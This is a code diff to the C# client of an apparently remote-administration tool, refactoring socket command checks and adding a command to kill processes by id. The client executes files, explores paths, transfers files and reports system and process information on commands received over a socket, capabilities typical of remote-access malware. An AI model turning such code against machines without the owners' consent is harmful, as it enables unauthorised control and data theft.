@@ -61,26 +61,26 @@ namespace Client
 
                             string cmd = Encoding.UTF8.GetString(commandBuffer);
 
-                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.NotifyMessage)) > -1)
+                            if (cmd.IsSocketCommmmand(SocketCommands.NotifyMessage))
                             {
                                 string receivedMessage = cmd.Replace(Types.SocketCommand(SocketCommands.NotifyMessage), "");
 
                                 MessageBox.Show(receivedMessage);
                             }
 
-                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.ExecFile)) > -1)
+                            if (cmd.IsSocketCommmmand(SocketCommands.ExecFile))
                             {
                                 string receivedPath = cmd.Replace(Types.SocketCommand(SocketCommands.ExecFile), "");
 
-                                Process.Start(receivedPath);
+                                Process openendProcess = Process.Start(receivedPath);
                             }
 
-                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.PingTarget)) > -1)
+                            if (cmd.IsSocketCommmmand(SocketCommands.PingTarget))
                             {
                                 throw new ArgumentException("Not Implemented");
                             }
 
-                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.ExplorePath)) > -1)
+                            if (cmd.IsSocketCommmmand(SocketCommands.ExplorePath))
                             {
                                 List<ItemType> items = new();
 
@@ -101,7 +101,7 @@ namespace Client
                                 await ManagementSocketConnection.SocketWriterAsync(socket, itemsBuffer, cancellationToken);
                             }
 
-                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.NotifyOSInformations)) > -1)
+                            if (cmd.IsSocketCommmmand(SocketCommands.NotifyOSInformations))
                             {
                                 SystemInfo systemInfo = new(
                                     Environment.OSVersion.Platform,
@@ -114,17 +114,17 @@ namespace Client
                                 await ManagementSocketConnection.SocketWriterAsync(socket, osInfoBuffer, cancellationToken);
                             }
 
-                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.NotifyShellCommand)) > -1)
+                            if (cmd.IsSocketCommmmand(SocketCommands.NotifyShellCommand))
                             {
                                 throw new ArgumentException("Not Implemented");
                             }
 
-                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.RemoteShutdown)) > -1)
+                            if (cmd.IsSocketCommmmand(SocketCommands.RemoteShutdown))
                             {
                                 throw new ArgumentException("Not Implemented");
                             }
 
-                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.UploadFile)) > -1)
+                            if (cmd.IsSocketCommmmand(SocketCommands.UploadFile))
                             {
                                 string receivedPath = cmd.Replace(Types.SocketCommand(SocketCommands.UploadFile), "");
 
@@ -137,7 +137,7 @@ namespace Client
                                 fileStream.Close();
                             }
 
-                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.DownLoadFile)) > -1)
+                            if (cmd.IsSocketCommmmand(SocketCommands.DownLoadFile))
                             {
                                 string receivedPath = cmd.Replace(Types.SocketCommand(SocketCommands.DownLoadFile), "");
 
@@ -146,7 +146,7 @@ namespace Client
                                 await ManagementSocketConnection.SocketWriterAsync(socket, buffer, cancellationToken);
                             }
 
-                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.GetProcesses)) > -1)
+                            if (cmd.IsSocketCommmmand(SocketCommands.GetProcesses))
                             {
                                 List<ProcessInfo> processes = new();
 
@@ -156,6 +156,13 @@ namespace Client
                                 byte[] processesBuffer = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(processes));
 
                                 await ManagementSocketConnection.SocketWriterAsync(socket, processesBuffer, cancellationToken);
+                            }
+
+                            if (cmd.IsSocketCommmmand(SocketCommands.KillProcess))
+                            {
+                                string receivedProcess = cmd.Replace(Types.SocketCommand(SocketCommands.KillProcess), "");
+
+                                Process.GetProcessById(int.Parse(receivedProcess)).Kill();
                             }
                         }
                         catch (Exception ex)
